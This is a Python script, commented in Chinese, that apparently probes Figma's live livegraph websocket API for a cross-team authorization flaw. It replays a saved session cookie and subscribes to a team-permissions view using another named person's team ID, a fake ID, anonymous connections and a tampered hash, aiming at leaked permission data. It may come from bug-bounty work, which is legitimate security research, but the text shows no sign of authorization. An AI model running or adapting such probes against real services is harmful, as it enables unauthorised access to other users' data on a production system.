"""livegraph subscribe 消息测试（跨团队权限查询）

消息结构（JS requestSubscription 确定性来源）：
  {"messageType":"subscribe","viewName":name,"viewHash":hash,"loadType":type,"args":args,"traceId":id}

创造目标：args.teamId 是否被服务端校验属于当前用户 →
  subscribe CurrentTeamCombinedPermissions + 任意 teamId = 跨团队权限数据泄露。
"""
import json, sys, time, base64, uuid
import websocket

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SESS = json.load(open(r"D:\scan\_figma_hunt\figma_session.json"))
COOKIE = "; ".join(f"{c['name']}={c['value']}" for c in SESS if c.get("name") and c.get("value"))

TEAM = "1666382706663462213"
OTHER_TEAM = "1484993099407069875"   # Xi He 的 team（公开文件 owner）
GHOST_TEAM = "9999999999999999999"
HASH = "f25ed3eceb859f73d4484895786b72fcf082f473c83967f96136f7fa8d0f05b4"

PR = "e5b828076698c1d9"
PT = "1786081987"
PH = "9xNUKy_inuuDiWuwhw6JnjwpvMtdcdgfBBpeeeunrp0"
COMMIT = "5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
USER = "1666382703778278399"
ANON = "09725c80-4313-4749-9eda-a73821e1496e"


def url_for(team_id, hash_val=HASH):
    pre = base64.b64encode(json.dumps({"CurrentTeamCombinedPermissions": {"hash": hash_val, "args": {"teamId": team_id}}}).encode()).decode()
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr={PR}&pt={PT}&ph={PH}"
            f"&userId={USER}&anonUserId={ANON}&clientType=web&commitHash={COMMIT}"
            f"&preload={pre}&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Fdesign%2FqzDqStIDJyGbthpKiuvfwg%2Ftest"
            f"&connectionType=initial&reconnect=0")


def run(name, team_id, use_cookie, hash_val=HASH, view="CurrentTeamCombinedPermissions", wait=6):
    headers = ["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36"]
    if use_cookie:
        headers.append(f"Cookie: {COOKIE}")
    try:
        ws = websocket.create_connection(url_for(team_id, hash_val), timeout=15, origin="https://www.figma.com", header=headers)
    except Exception as e:
        print(f"  {name}: 握手失败 {type(e).__name__}: {e}")
        return
    # 发 subscribe
    msg = {"messageType": "subscribe", "viewName": view, "viewHash": hash_val,
           "loadType": "Initial", "args": {"teamId": team_id}, "traceId": str(uuid.uuid4())}
    try:
        ws.send(json.dumps(msg))
        print(f"  {name}: 已发送 subscribe teamId={team_id} hash={hash_val[:12]}...")
    except Exception as e:
        print(f"  {name}: send 失败 {e}")
        ws.close()
        return
    # 收数据
    got = []
    closed = False
    end = time.time() + wait
    while time.time() < end:
        try:
            ws.settimeout(min(2, end - time.time()))
            opcode, data = ws.recv_data()
            if opcode == 0x8:
                closed = True
                break
            if opcode == 0x2 or opcode == 0x1:
                got.append(data)
        except websocket.WebSocketTimeoutException:
            continue
        except Exception:
            closed = True
            break
    ws.close()
    print(f"  {name}: {'CLOSE' if closed else '保持'}, 收到 {len(got)} 条, {sum(len(g) for g in got)}B")
    for g in got[:4]:
        try:
            print(f"     {g.decode(errors='replace')[:250]}")
        except Exception:
            print(f"     bin {g[:60].hex()}")


if __name__ == "__main__":
    print("=== livegraph subscribe 测试 ===")
    run("自己team 登录", TEAM, True)
    run("其他team 登录", OTHER_TEAM, True)
    run("ghost team 登录", GHOST_TEAM, True)
    run("自己team 匿名", TEAM, False)
    run("其他team 匿名", OTHER_TEAM, False)
    run("自己team hash篡改 登录", TEAM, True, hash_val="f" * 64)
